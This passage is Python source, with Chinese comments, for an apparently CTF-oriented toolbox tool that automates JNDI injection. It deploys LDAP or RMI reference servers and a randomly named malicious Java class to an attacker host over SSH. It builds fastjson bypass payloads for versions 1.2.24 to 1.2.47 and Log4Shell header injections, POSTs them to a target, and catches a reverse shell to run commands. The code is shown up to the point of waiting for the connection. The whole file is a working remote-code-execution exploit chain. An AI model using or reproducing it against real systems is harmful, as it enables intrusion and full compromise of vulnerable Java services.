"""JNDI 注入一键利用（web.jndi）—— 普适版。

覆盖的触发面：
- fastjson：1.2.24 直接 @type / 1.2.41 L...; / 1.2.42 LL...;; / 1.2.43 [...[{ /
  1.2.47 Class-val 缓存绕过，五种版本绕过模板（trigger 参数选择）；
- Log4j2 CVE-2021-44228：payload ${jndi:...} 注入请求头 + POST body；
- 自定义模板（{{JNDI_URL}} / {{GADGET}} 占位符）适配其他 JSON 解析场景。

JNDI 引用协议：LDAP（默认）或 RMI（rmi_server.java，LDAP 被拦时用）。
反弹 shell 类为纯 Java Socket（Exploit.java，shell 路径可配），类名随机化规避
目标 JVM 同名类缓存；成功后可选保持交互会话（interactive）。

执行流程：
1. 通过 PuTTY plink（putty_dir 参数指定目录）SSH 登录攻击服务器；
2. 上传恶意类模板与引用服务（LDAP: ldap_server.py / RMI: rmi_server.java），编译；
3. 后台启动：HTTP 服务（供目标下载 .class）、引用服务、反弹监听（fifo 保活）；
4. 按 trigger 生成 PoC（可选自动 POST 到靶机端点）；
5. 探测反弹连接 → 经 fifo 下发命令 → 读取命令输出（可选保持交互会话）。

限制：
- 需要运行工具箱的机器安装 PuTTY（plink.exe / pscp.exe）；
- 远程服务器需有 javac / python3（RMI 模式还需可运行 java），防火墙放行
  引用服务、HTTP、反弹端口；
- JDK < 8u191 默认支持远程类加载；更高版本需目标开启
  com.sun.jndi.ldap.object.trustURLCodebase 或使用高版本绕过链（如
  tomcat-el BeanFactory 等，本工具暂不内置）。

仅用于授权 CTF / 安全测试环境。
"""
from __future__ import annotations

import asyncio
import base64
import json
import random
import re
import shutil
import socket
import ssl
import string
import time
import urllib.parse
import urllib.request
from pathlib import Path

from app.core.registry import register_tool
from app.core.tool import Category, ParamSpec, Status, Tool, ToolContext, ToolResult

TEMPLATE_DIR = Path(__file__).resolve().parent / "jndi_files"
DEFAULT_GADGET = "com.sun.rowset.JdbcRowSetImpl"
DEFAULT_PUTTY_DIR = r"D:\putty"

# 触发模板：{{JNDI_URL}} 与 {{GADGET}} 为占位符。
# fastjson_* 走 JSON POST；log4j2 走请求头 + body 注入。
POC_TEMPLATES = {
    "fastjson_1.2.24": '{"@type": "{{GADGET}}", "dataSourceName": "{{JNDI_URL}}", "autoCommit": true}',
    "fastjson_1.2.41": '{"@type": "L{{GADGET}};", "dataSourceName": "{{JNDI_URL}}", "autoCommit": true}',
    "fastjson_1.2.42": '{"@type": "LL{{GADGET}};;", "dataSourceName": "{{JNDI_URL}}", "autoCommit": true}',
    "fastjson_1.2.43": '{"@type": "[{{GADGET}}[{", "dataSourceName": "{{JNDI_URL}}", "autoCommit": true}',
    "fastjson_1.2.47": (
        '{"a": {"@type": "java.lang.Class", "val": "{{GADGET}}"}, '
        '"b": {"@type": "{{GADGET}}", "dataSourceName": "{{JNDI_URL}}", "autoCommit": true}}'
    ),
    "log4j2": "${jndi:{{JNDI_URL}}}",
}
LOG4J_DEFAULT_HEADERS = "X-Api-Version,User-Agent,X-Forwarded-For"


def _random_class_name() -> str:
    """随机化恶意类名：目标 JVM 对同名类只加载一次（静态块不重复执行），
    每次运行使用新类名才能再次触发。"""
    return "Exploit" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def _find_exe(putty_dir: str, name: str) -> str | None:
    """在指定目录或 PATH 中查找 PuTTY 工具。"""
    if putty_dir:
        cand = Path(putty_dir) / f"{name}.exe"
        if cand.is_file():
            return str(cand)
    return shutil.which(name)


def _post_json(url: str, payload: str, timeout: int = 15) -> tuple[int | None, str]:
    """POST JSON 到靶机端点（容忍自签名证书）。返回 (status_code, body)。"""
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(
        url,
        data=payload.encode("utf-8"),
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=context) as resp:
            return resp.status, resp.read().decode(errors="replace")[:500]
    except Exception as exc:  # noqa: BLE001
        return None, f"{type(exc).__name__}: {exc}"


def _post_log4j(
    url: str, payload: str, headers: dict[str, str], timeout: int = 15
) -> tuple[int | None, str]:
    """Log4j2 触发：payload 注入指定请求头（如 User-Agent / X-Api-Version），
    同时放入 POST body（部分应用会把 body 写进日志）。容忍自签名证书。"""
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(
        url,
        data=payload.encode("utf-8"),
        method="POST",
        headers={"Content-Type": "text/plain", **headers},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=context) as resp:
            return resp.status, resp.read().decode(errors="replace")[:500]
    except Exception as exc:  # noqa: BLE001
        return None, f"{type(exc).__name__}: {exc}"


def _check_external(host: str, ports: list[int], timeout: float = 3.0) -> dict[int, str]:
    """从本机直连公网服务器的端口，验证云安全组/防火墙已放行入站。

    服务器内部 ss 只能确认进程在监听，云厂商安全组未放行时外部依然不可达；
    工具运行在本机，正好充当外部探测点（靶机同方向）。
    """
    result: dict[int, str] = {}
    for port in ports:
        try:
            with socket.create_connection((host, port), timeout=timeout):
                result[port] = "OK"
        except Exception as exc:  # noqa: BLE001
            result[port] = f"{type(exc).__name__}: {exc}"
    return result


class PlinkClient:
    """基于 PuTTY plink / pscp 的 SSH 客户端封装（零第三方依赖）。

    主机密钥策略：首次连接时 plink -batch 会因 "host key is not cached" 失败，
    从报错中提取 SHA256 指纹后用 -hostkey 固定该指纹（TOFU 式信任），
    此后所有调用显式携带 -hostkey，全程无交互、不依赖控制台。
    """

    def __init__(
        self, host: str, port: int, user: str, password: str, putty_dir: str = ""
    ) -> None:
        self.host = host
        self.port = port
        self.user = user
        self.password = password
        self.plink = _find_exe(putty_dir, "plink")
        self.pscp = _find_exe(putty_dir, "pscp")
        self._host_key_fp: str | None = None

    @property
    def target(self) -> str:
        return f"{self.user}@{self.host}"

    _TRANSIENT_HINTS = (
        "network error",
        "connection abort",
        "connection refused",
        "connection timed out",
        "connection reset",
    )

    async def _run(
        self, args: list[str], stdin: bytes | None = None, timeout: int = 60,
        attempts: int = 5,
    ) -> tuple[int, str, str]:
        """运行 PuTTY 进程。公网 VPS 的 sshd 常因爆破流量（MaxStartups）随机
        丢弃未认证连接，瞬时网络错误自动重试；认证/主机密钥类错误立即返回
        （交给 exec() 的 TOFU 指纹固定逻辑处理）。"""
        for attempt in range(1, attempts + 1):
            proc = await asyncio.create_subprocess_exec(
                *args,
                stdin=asyncio.subprocess.PIPE if stdin is not None else asyncio.subprocess.DEVNULL,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            try:
                out_b, err_b = await asyncio.wait_for(
                    proc.communicate(input=stdin), timeout=timeout
                )
            except asyncio.TimeoutError:
                proc.kill()
                await proc.communicate()
                return -1, "", f"执行超时（>{timeout}s）"
            out = out_b.decode(errors="replace")
            err = err_b.decode(errors="replace")
            if proc.returncode == 0:
                return proc.returncode, out, err
            if attempt < attempts and any(
                hint in err.lower() for hint in self._TRANSIENT_HINTS
            ):
                await asyncio.sleep(2 * attempt)
                continue
            return proc.returncode, out, err
        return -1, "", ""  # pragma: no cover

    def _opts(self, for_pscp: bool = False) -> list[str]:
        opts = ["-batch", "-P", str(self.port), "-pw", self.password]
        if self._host_key_fp:
            opts += ["-hostkey", self._host_key_fp]
        if not for_pscp:  # pscp 不支持 -no-antispoof
            opts.insert(1, "-no-antispoof")
        return opts

    def _plink_args(self, cmd: str) -> list[str]:
        return [self.plink, "-ssh", *self._opts(), self.target, cmd]

    def _pscp_args(self, proto: str, local: str, remote: str) -> list[str]:
        return [
            self.pscp, proto, *self._opts(for_pscp=True),
            local, f"{self.target}:{remote}",
        ]

    async def exec(self, cmd: str, timeout: int = 60) -> tuple[int, str, str]:
        """远程执行命令，返回 (exit_code, stdout, stderr)。"""
        if not self.plink:
            return -1, "", "未找到 plink.exe（请安装 PuTTY 或通过 putty_dir 参数指定目录）"
        code, out, err = await self._run(self._plink_args(cmd), timeout=timeout)
        if code != 0 and "host key is not cached" in err.lower() and not self._host_key_fp:
            match = re.search(r"SHA256:([A-Za-z0-9+/=]+)", err)
            if match:
                self._host_key_fp = f"SHA256:{match.group(1)}"
                code, out, err = await self._run(self._plink_args(cmd), timeout=timeout)
            else:
                err += "\n（无法提取主机密钥指纹，请用 putty 手动连接一次缓存密钥后重试）"
        return code, out, err

    async def put_text(self, local_path: Path, remote_path: str, timeout: int = 90) -> tuple[int, str]:
        """上传文本文件（pscp，SCP 协议失败时回退 SFTP）。"""
        if not self.pscp:
            return -1, "未找到 pscp.exe"
        await self.exec("exit", timeout=30)  # 确保主机密钥指纹已固定
        last_code, last_msg = -1, ""
        for proto in ("-scp", "-sftp"):
            code, out, err = await self._run(
                self._pscp_args(proto, str(local_path), remote_path), timeout=timeout
            )
            last_code, last_msg = code, (out + err).strip()
            if code == 0:
                return 0, ""
        return last_code, last_msg


class _InteractiveShell:
    """反弹 shell 的交互会话：经 fifo 下发命令、增量读取输出。

    命令完成判定：每条命令后追加一行唯一 marker（echo MARKER$?），读到
    marker 即认为执行完毕；超时则返回已产生的增量输出。输出偏移按「解码后
    字符长度」在会话内累计（tail -c 按字节，多字节 UTF-8 会错位，故采用
    整文件读取 + 内存切片），文件量级很小，代价可忽略。
    """

    def __init__(self, client: "PlinkClient", workdir: str, pids: dict[str, str],
                 note, ref_svc: str = "ldap") -> None:
        self.client = client
        self.workdir = workdir
        self.pids = dict(pids)
        self.note = note
        self.ref_svc = ref_svc
        self._last_len = 0
        self._seq = 0

    async def setup(self) -> None:
        """建立基线：注册前 rev.out 已有内容（banner、初始命令输出）不算新输出；
        并回收 HTTP/引用服务——类已加载完毕，这两个一次性服务不再需要。"""
        _, out, _ = await self.client.exec(
            f"cat {self.workdir}/rev.out 2>/dev/null", timeout=20
        )
        self._last_len = len(out)
        for name in ("http", self.ref_svc):
            pid = self.pids.get(name)
            if pid:
                await self.client.exec(f"kill {pid} 2>/dev/null || true", timeout=20)

    async def exec_command(self, command: str, timeout: float) -> tuple[str, bool, bool]:
        self._seq += 1
        marker = f"__CTF_DONE_{self._seq}__"
        payload = f"{command}\necho {marker}$?\n"
        b64 = base64.b64encode(payload.encode()).decode()
        code, out, err = await self.client.exec(
            f"echo {b64} | base64 -d >{self.workdir}/rev.fifo", timeout=30
        )
        if code != 0:
            # fifo 写入失败（无读者/SSH 超时）：shell 大概率已断开
            return f"[下发失败] {(out + err).strip()}", False, True

        deadline = time.time() + timeout
        new = ""
        while time.time() < deadline:
            code, out, _ = await self.client.exec(
                f"cat {self.workdir}/rev.out 2>/dev/null", timeout=20
            )
            if code == 0:
                new = out[self._last_len:]
                if marker in new:
                    break
            await asyncio.sleep(0.6)
        self._last_len += len(new)
        timed_out = marker not in new
        closed = "Connection closed" in new

        if marker in new:
            # 丢弃 marker 行及其后内容（可能混有监听器日志）
            kept = []
            for ln in new.splitlines():
                if ln.startswith(marker):
                    break
                kept.append(ln)
            new = "\n".join(kept)
        # 监听器自身日志不属于命令输出
        new = "\n".join(
            ln
            for ln in new.splitlines()
            if not re.match(
                r"^(Listening on |Rejected connection|Accepted connection|Connection closed)",
                ln,
            )
        )
        return new.rstrip("\n"), timed_out, closed

    async def close(self) -> None:
        """清理远程环境：杀监听器与 fifo 保活进程、删工作目录。"""
        kill_targets = " ".join(
            p for p in (self.pids.get("listener"), self.pids.get("fifo")) if p
        )
        if kill_targets:
            await self.client.exec(f"kill {kill_targets} 2>/dev/null || true", timeout=20)
        await self.client.exec(
            "pkill -f 'sleep 999[9]99' 2>/dev/null; "
            "pkill -f 'reverse_listene[r]' 2>/dev/null || true",
            timeout=20,
        )
        await self.client.exec(f"rm -rf {self.workdir}", timeout=20)


@register_tool
class JndiExploitTool(Tool):
    name = "jndi"
    category = Category.WEB
    version = "1.0.0"
    timeout = 300
    description = (
        "JNDI 注入一键利用：SSH 自动在远程服务器部署 LDAP 引用服务与恶意类，"
        "生成 fastjson 1.2.47 PoC，监听端口捕获反弹 shell 并执行命令。"
        "适用 JDK<8u191（LDAP 远程类加载默认可用）；需本机安装 PuTTY。"
    )
    params = [
        ParamSpec("ssh_host", type="str", required=True, description="攻击服务器 IP/域名（部署 JNDI 环境与监听）"),
        ParamSpec("ssh_port", type="int", required=False, default=22, description="SSH 端口"),
        ParamSpec("ssh_user", type="str", required=True, description="SSH 用户名"),
        ParamSpec("ssh_pass", type="password", required=True, description="SSH 密码（前端以掩码输入框渲染）"),
        ParamSpec("putty_dir", type="str", required=False, default=DEFAULT_PUTTY_DIR, description="PuTTY 目录（plink.exe/pscp.exe），留空则从 PATH 查找"),
        ParamSpec("lhost", type="str", required=False, default="", description="靶机可访问的回连公网 IP，默认取 ssh_host"),
        ParamSpec("ldap_port", type="int", required=False, default=1389, description="LDAP 引用服务端口（jndi_protocol=ldap 时生效）"),
        ParamSpec("jndi_protocol", type="str", required=False, default="ldap", description="JNDI 引用协议: ldap | rmi（LDAP 被拦/不支持时用 RMI）"),
        ParamSpec("rmi_port", type="int", required=False, default=1099, description="RMI 注册表端口（jndi_protocol=rmi 时生效）"),
        ParamSpec("http_port", type="int", required=False, default=8888, description="恶意类 HTTP 下载端口"),
        ParamSpec("lport", type="int", required=False, default=31339, description="反弹 shell 监听端口"),
        ParamSpec("target_url", type="str", required=False, default="", description="靶机漏洞端点（如 http://靶机/login），留空则不自动发送 PoC"),
        ParamSpec("trigger", type="str", required=False, default="fastjson_1.2.47", description="触发模板: fastjson_1.2.24/1.2.41/1.2.42/1.2.43/1.2.47 | log4j2 | custom"),
        ParamSpec("custom_template", type="text", required=False, default="", description="trigger=custom 时使用，占位符 {{JNDI_URL}} {{GADGET}}"),
        ParamSpec("log4j_header", type="str", required=False, default=LOG4J_DEFAULT_HEADERS, description="log4j2 触发时注入的请求头（逗号分隔，payload 同时放入 POST body）"),
        ParamSpec("command", type="str", required=False, default="cat /flag", description="拿到 shell 后执行的命令"),
        ParamSpec("interactive", type="bool", required=False, default=True, description="成功反弹后保持交互会话（前端可继续下发命令，关闭会话时自动清理远程环境）"),
        ParamSpec("gadget_class", type="str", required=False, default=DEFAULT_GADGET, description="JNDI 触发链类"),
        ParamSpec("wait_time", type="int", required=False, default=60, description="等待反弹连接超时（秒）"),
        ParamSpec("shell", type="str", required=False, default="/bin/sh", description="反弹 shell 进程路径（靶机容器可能没有 bash，默认 /bin/sh）"),
        ParamSpec("cleanup", type="bool", required=False, default=True, description="结束后清理远程进程与工作目录（交互会话由前端「关闭会话」按钮清理）"),
    ]

    # ---- SSH 便捷封装 ----

    @staticmethod
    async def _wait_connection(client: PlinkClient, lport: int, wait_time: int) -> bool:
        """轮询远程 ss/netstat 判断 nc 端口是否有 ESTABLISHED 连接。"""
        deadline = time.time() + wait_time
        while time.time() < deadline:
            _, out, _ = await client.exec(
                f"(ss -tn 2>/dev/null || netstat -tn 2>/dev/null) | grep -cE ':{lport}\\s' || true",
                timeout=20,
            )
            if out.strip().isdigit() and int(out.strip()) > 0:
                return True
            await asyncio.sleep(3)
        return False

    @staticmethod
    async def _wait_listen(client: PlinkClient, lport: int, timeout: int = 30) -> bool:
        """轮询确认 nc 已在 lport 进入 LISTEN，避免回连早于监听建立的竞态。

        背景：nc 经 fifo 管道启动，若尚未监听就 POST PoC，目标加载恶意类后
        的 Socket 回连会被 RST，反弹静默失败（类名缓存导致无法原样重试）。
        """
        deadline = time.time() + timeout
        while time.time() < deadline:
            code, out, _ = await client.exec(
                f"ss -tln 2>/dev/null | grep -cE ':{lport}\\s' || true",
                timeout=20,
            )
            if code == 0 and out.strip().isdigit() and int(out.strip()) > 0:
                return True
            await asyncio.sleep(2)
        return False

    @staticmethod
    async def _send_command(client: PlinkClient, workdir: str, command: str) -> None:
        """经 fifo 向反弹 shell 下发命令（base64 传递避免引号转义问题）。

        必须在末尾补换行符：shell 读到行结束符才会执行命令。
        """
        b64 = base64.b64encode((command + "\n").encode()).decode()
        await client.exec(f"echo {b64} | base64 -d >{workdir}/rev.fifo", timeout=30)

    @staticmethod
    async def _read_output(client: PlinkClient, workdir: str) -> str:
        _, out, _ = await client.exec(f"cat {workdir}/rev.out 2>/dev/null", timeout=30)
        return out

    # ---- 主流程 ----

    async def run(self, params: dict, ctx: ToolContext) -> ToolResult:
        ssh_host = params["ssh_host"].strip()
        ssh_port = int(params.get("ssh_port") or 22)
        ssh_user = params["ssh_user"].strip()
        ssh_pass = params["ssh_pass"]
        putty_dir = (params.get("putty_dir") or "").strip()
        lhost = (params.get("lhost") or "").strip() or ssh_host
        ldap_port = int(params.get("ldap_port") or 1389)
        jndi_protocol = (params.get("jndi_protocol") or "ldap").strip().lower()
        rmi_port = int(params.get("rmi_port") or 1099)
        http_port = int(params.get("http_port") or 8888)
        lport = int(params.get("lport") or 31339)
        target_url = (params.get("target_url") or "").strip()
        trigger = (params.get("trigger") or "fastjson_1.2.47").strip()
        custom_template = (params.get("custom_template") or "").strip()
        log4j_header = (params.get("log4j_header") or LOG4J_DEFAULT_HEADERS).strip()
        command = (params.get("command") or "cat /flag").strip()
        gadget = (params.get("gadget_class") or DEFAULT_GADGET).strip()
        wait_time = max(5, int(params.get("wait_time") or 60))
        cleanup = bool(params.get("cleanup", True))
        interactive = bool(params.get("interactive", True))
        shell = (params.get("shell") or "/bin/sh").strip()

        if jndi_protocol not in ("ldap", "rmi"):
            raise RuntimeError(f"未知 jndi_protocol: {jndi_protocol}（可选: ldap | rmi）")
        is_rmi = jndi_protocol == "rmi"
        ref_port = rmi_port if is_rmi else ldap_port
        is_log4j = trigger == "log4j2"

        cls_name = _random_class_name()
        codebase = f"http://{lhost}:{http_port}/"
        jndi_url = f"rmi://{lhost}:{rmi_port}/{cls_name}" if is_rmi else f"ldap://{lhost}:{ldap_port}/{cls_name}"
        workdir = f"/tmp/ctf-jndi-{int(time.time())}"
        pids: dict[str, str] = {}
        log: list[str] = []
        shell_output = ""
        connected = False
        http_resp: dict | None = None
        status = Status.ERROR
        stderr = ""
        poc: dict = {}
        poc_raw = ""
        curl_cmd = ""
        session_id = ""
        keep_session = False

        def note(line: str) -> None:
            log.append(line)

        client = PlinkClient(ssh_host, ssh_port, ssh_user, ssh_pass, putty_dir)
        if not client.plink:
            return ToolResult(
                status=Status.ERROR,
                stderr="未找到 plink.exe：请安装 PuTTY，或通过 putty_dir 参数指定目录",
            )

        try:
            # [1] SSH 连接
            note(f"[1/7] SSH 连接 {ssh_user}@{ssh_host}:{ssh_port} ...")
            code, out, err = await client.exec("echo OK", timeout=30)
            if code != 0 or "OK" not in out:
                raise RuntimeError(f"SSH 连接/认证失败: {(out + err).strip()[:300]}")
            note("      连接成功")

            # [2] 环境与端口检查
            note("[2/7] 检查远程环境（javac/python3/base64）...")
            code, out, _ = await client.exec(
                "for c in javac python3 base64; do command -v $c >/dev/null 2>&1 || echo MISSING:$c; done"
            )
            missing = [line.split(":", 1)[1] for line in out.splitlines() if line.startswith("MISSING:")]
            if missing:
                raise RuntimeError(
                    f"远程服务器缺少依赖: {', '.join(missing)}（javac 可执行 apt install default-jdk）"
                )
            code, out, _ = await client.exec(
                f"ss -tln 2>/dev/null | grep -E ':({http_port}|{ref_port}|{lport}) ' || true"
            )
            if out.strip():
                raise RuntimeError(f"远程服务器端口已被占用:\n{out.strip()}")
            # [3] 部署模板并编译
            note(f"[3/7] 生成模板并部署到 {workdir} ...")
            await client.exec(f"mkdir -p {workdir}")
            java_src = (TEMPLATE_DIR / "Exploit.java").read_text(encoding="utf-8")
            java_src = java_src.replace("class Exploit", f"class {cls_name}", 1)
            java_src = java_src.replace(
                "{{SHELL}}", shell.replace("\\", "\\\\").replace('"', '\\"')
            )
            java_src = java_src.replace("{{HOST}}", lhost)
            java_src = java_src.replace("{{PORT}}", str(lport))
            ldap_src = (TEMPLATE_DIR / "ldap_server.py").read_text(encoding="utf-8")
            listener_src = (TEMPLATE_DIR / "reverse_listener.py").read_text(encoding="utf-8")
            ctx.workdir.mkdir(parents=True, exist_ok=True)
            local_java = ctx.workdir / f"{cls_name}.java"
            local_ldap = ctx.workdir / "ldap_server.py"
            local_listener = ctx.workdir / "reverse_listener.py"
            local_java.write_text(java_src, encoding="utf-8")
            local_ldap.write_text(ldap_src, encoding="utf-8")
            local_listener.write_text(listener_src, encoding="utf-8")
            code, msg = await client.put_text(local_java, f"{workdir}/{cls_name}.java")
            if code != 0:
                raise RuntimeError(f"上传 {cls_name}.java 失败: {msg}")
            code, msg = await client.put_text(local_ldap, f"{workdir}/ldap_server.py")
            if code != 0:
                raise RuntimeError(f"上传 ldap_server.py 失败: {msg}")
            code, msg = await client.put_text(local_listener, f"{workdir}/reverse_listener.py")
            if code != 0:
                raise RuntimeError(f"上传 reverse_listener.py 失败: {msg}")
            if is_rmi:
                rmi_src = (TEMPLATE_DIR / "rmi_server.java").read_text(encoding="utf-8")
                local_rmi = ctx.workdir / "rmi_server.java"
                local_rmi.write_text(rmi_src, encoding="utf-8")
                # public class 必须与文件名一致，远端统一用 RMIServer.java
                code, msg = await client.put_text(local_rmi, f"{workdir}/RMIServer.java")
                if code != 0:
                    raise RuntimeError(f"上传 RMIServer.java 失败: {msg}")
                # com.sun.jndi.rmi.registry 随 JDK 版本搬家：JDK 17+ 在 jdk.naming.rmi
                # 模块（还需 --add-modules 拉入模块图）、JDK 9-16 在 java.naming、
                # JDK 8 无模块系统直接编译。逐级回退直到成功。
                compile_cmds = [
                    "javac --add-modules jdk.naming.rmi "
                    "--add-exports jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED "
                    f"{workdir}/RMIServer.java 2>&1",
                    "javac --add-exports java.naming/com.sun.jndi.rmi.registry=ALL-UNNAMED "
                    f"{workdir}/RMIServer.java 2>&1",
                    f"javac {workdir}/RMIServer.java 2>&1",
                ]
                code, out, err = -1, "", ""
                for ccmd in compile_cmds:
                    code, out, err = await client.exec(ccmd)
                    if code == 0:
                        break
                if code != 0:
                    raise RuntimeError(f"RMIServer.java 编译失败:\n{(out + err).strip()[:500]}")
            # 靶机 JDK 常为 Java 8：优先 --release 8 产出 major 52 字节码；
            # 老版 javac（JDK 8 本身）无 --release 选项，报 invalid flag 时回退。
            code, out, err = await client.exec(
                f"cd {workdir} && javac --release 8 {cls_name}.java 2>&1"
            )
            if code != 0 and "release" in (out + err) and (
                "invalid flag" in (out + err) or "unrecognized" in (out + err)
            ):
                code, out, err = await client.exec(
                    f"cd {workdir} && javac {cls_name}.java 2>&1"
                )
            if code != 0:
                raise RuntimeError(f"javac 编译失败:\n{(out + err).strip()[:500]}")
            note(f"      编译成功: {workdir}/{cls_name}.class（--release 8，兼容 Java 8 靶机）")

            # [4] 启动服务
            ref_label = "RMI" if is_rmi else "LDAP"
            note(f"[4/7] 启动 HTTP/{http_port}、{ref_label}/{ref_port}、反弹监听/{lport} ...")
            note("      请确保服务器防火墙/安全组放行上述端口入站")
            # 反弹监听白名单 = 靶机出口 IP：工具自身的公网探测、安全组探测、
            # 端口扫描器连上时一律拒绝，避免 nc 单连接语义下探测连接“抢走”
            # 唯一 shell 会话槽位、真实回连被 RST 的竞态。
            allow_ip = ""
            if target_url:
                tgt_host = urllib.parse.urlparse(target_url).hostname or ""
                if tgt_host:
                    try:
                        allow_ip = socket.gethostbyname(tgt_host)
                    except OSError:
                        allow_ip = ""
            # 注意：不要用 `cd X && nohup ... &` 这种后台 AND-列表——
            # bash 对其走 subshell 路径，子进程会占住 SSH channel fd，
            # 远端 shell 退出后 plink 等不到 EOF 一直挂到超时（PID 也拿不到）。
            # 全部改用绝对路径 / --directory，后台只放单个 nohup 命令。
            start_cmds = {
                "http": (
                    f"nohup python3 -m http.server {http_port} --bind 0.0.0.0 "
                    f"--directory {workdir} </dev/null >{workdir}/http.log 2>&1 & echo $!"
                ),
                # RMI 运行参数与编译同构：JDK 17+ / JDK 9-16 / JDK 8 逐级回退
                # （java 对未知模块的 --add-exports 会直接报错退出）
                ("rmi" if is_rmi else "ldap"): (
                    [
                        (
                            f"nohup java --add-modules jdk.naming.rmi "
                            f"--add-exports jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED "
                            f"--add-opens jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED "
                            f"-cp {workdir} RMIServer {rmi_port} {codebase} {cls_name} "
                            f"</dev/null >{workdir}/rmi.log 2>&1 & echo $!"
                        ),
                        (
                            f"nohup java --add-exports java.naming/com.sun.jndi.rmi.registry=ALL-UNNAMED "
                            f"--add-opens java.naming/com.sun.jndi.rmi.registry=ALL-UNNAMED "
                            f"-cp {workdir} RMIServer {rmi_port} {codebase} {cls_name} "
                            f"</dev/null >{workdir}/rmi.log 2>&1 & echo $!"
                        ),
                        (
                            f"nohup java -cp {workdir} RMIServer {rmi_port} {codebase} {cls_name} "
                            f"</dev/null >{workdir}/rmi.log 2>&1 & echo $!"
                        ),
                    ]
                    if is_rmi
                    else (
                        f"nohup python3 {workdir}/ldap_server.py 0.0.0.0 {ldap_port} "
                        f"{codebase} {cls_name} </dev/null >{workdir}/ldap.log 2>&1 & echo $!"
                    )
                ),
                "fifo": (
                    # 用 3<> 以 O_RDWR 打开 fifo 并挂在 fd 3：O_RDWR 打开永不
                    # 阻塞、立即返回，保证 echo $! 能输出 PID。
                    # 关键：<> 只作用于 fd 0，若写成 `<>fifo </dev/null ...`，
                    # 后面的 </dev/null 会把 fd 0 换成 /dev/null、关闭 fifo 的
                    # fd —— sleep 实际不持有 fifo，监听器的只读打开会因无写者
                    # 永久阻塞、永不监听。挂 fd 3 则后续对 0/1/2 的重定向都
                    # 碰不到它。
                    # 0/1/2 也必须全部重定向：否则 sleep 继承 SSH channel fd，
                    # bash 退出后 sshd 等不到 EOF，plink 挂到超时、PID 丢失。
                    f"mkfifo {workdir}/rev.fifo; "
                    f"nohup sleep 999999 3<>{workdir}/rev.fifo </dev/null >/dev/null 2>&1 & echo $!"
                ),
                "listener": (
                    f"nohup python3 {workdir}/reverse_listener.py 0.0.0.0 {lport} "
                    f"{workdir}/rev.fifo {workdir}/rev.out {allow_ip} "
                    f"</dev/null >/dev/null 2>>{workdir}/rev.out & echo $!"
                ),
            }
            for name, cmds in start_cmds.items():
                candidates = cmds if isinstance(cmds, list) else [cmds]
                started = False
                for cmd in candidates:
                    code, out, _ = await client.exec(cmd)
                    pids[name] = out.strip().splitlines()[-1] if out.strip() else ""
                    if not isinstance(cmds, list):
                        started = True
                        break
                    # RMI 多候选：启动后以端口监听为准判定成败，失败换下一候选
                    await asyncio.sleep(2)
                    code, chk, _ = await client.exec(
                        f"ss -tln 2>/dev/null | grep -E ':{rmi_port} ' || true"
                    )
                    if chk.strip():
                        started = True
                        break
                if not started:
                    raise RuntimeError(
                        f"{name} 服务启动失败（端口 {rmi_port} 未监听，详见 {workdir}/{name}.log）"
                    )
            await asyncio.sleep(2)
            code, out, _ = await client.exec(
                f"ss -tln 2>/dev/null | grep -E ':({http_port}|{ref_port}|{lport}) ' || true"
            )
            note(f"      监听状态: {out.strip() or '（ss 不可用，跳过校验）'}")
            # 云安全组/防火墙可能拦入站：从本机（与靶机同方向）直连验证
            ext = await asyncio.to_thread(
                _check_external, lhost, [http_port, ref_port, lport]
            )
            blocked = [p for p, r in ext.items() if r != "OK"]
            if blocked:
                note(
                    "      外部可达性: " + " | ".join(
                        f"{p}: {r}" for p, r in ext.items()
                    ) + "（请放行安全组/防火墙入站）"
                )
            else:
                note(f"      外部可达性: 本机直连 HTTP/{ref_label}/反弹端口全部 OK")

            # [5] 生成 PoC
            note(f"[5/7] 生成 PoC（触发模板: {trigger}）...")
            template = POC_TEMPLATES.get(trigger)
            if trigger == "custom":
                template = custom_template
            if not template:
                raise RuntimeError(
                    f"未知 trigger: {trigger}（可选: {', '.join(sorted(POC_TEMPLATES))} 或 custom）"
                )
            poc_raw = template.replace("{{JNDI_URL}}", jndi_url).replace("{{GADGET}}", gadget)
            try:
                poc = json.loads(poc_raw)
            except ValueError:
                poc = {"raw": poc_raw}
            log4j_headers = {
                h: poc_raw for h in (x.strip() for x in log4j_header.split(",")) if h
            }
            if is_log4j:
                hdr_args = " ".join(f"-H '{h}: {poc_raw}'" for h in log4j_headers)
                curl_cmd = (
                    f"curl -s -X POST '{target_url or '<TARGET_URL>'}' "
                    f"{hdr_args} -d '{poc_raw}'"
                )
            else:
                curl_cmd = (
                    f"curl -s -X POST '{target_url or '<TARGET_URL>'}' "
                    f"-H 'Content-Type: application/json' -d '{poc_raw}'"
                )
            note(f"      JNDI: {jndi_url}（{jndi_protocol}）")
            note(f"      CodeBase: {codebase}")
            note(f"      类名: {cls_name}（每次运行随机化，规避目标 JVM 同名类缓存）")

            # [6] 发送 PoC
            if target_url:
                note("[6/7] 确认反弹监听就绪后 POST PoC ...")
                if await self._wait_listen(client, lport, timeout=30):
                    note(f"      监听器已在 {lport} 就绪，可以发送")
                else:
                    note(f"      监听器未在 {lport} 就绪（回连将被 RST），仍继续发送")
                if is_log4j:
                    note(
                        f"[6/7] POST PoC（请求头注入: {', '.join(log4j_headers)} + body）-> {target_url} ..."
                    )
                    resp_status, resp_body = await asyncio.to_thread(
                        _post_log4j, target_url, poc_raw, log4j_headers
                    )
                else:
                    note(f"[6/7] POST PoC -> {target_url} ...")
                    resp_status, resp_body = await asyncio.to_thread(_post_json, target_url, poc_raw)
                http_resp = (
                    {"status_code": resp_status, "body": resp_body}
                    if resp_status is not None
                    else {"error": resp_body}
                )
                note(f"      响应: {resp_status if resp_status is not None else '异常'} {resp_body[:200]}")
                note("      （fastjson 场景下 'set property error, autoCommit' 属预期回显）")
            else:
                note("[6/7] 未提供 target_url，跳过自动发送（请手动发送 PoC）")

            # [7] 等待反弹连接并执行命令
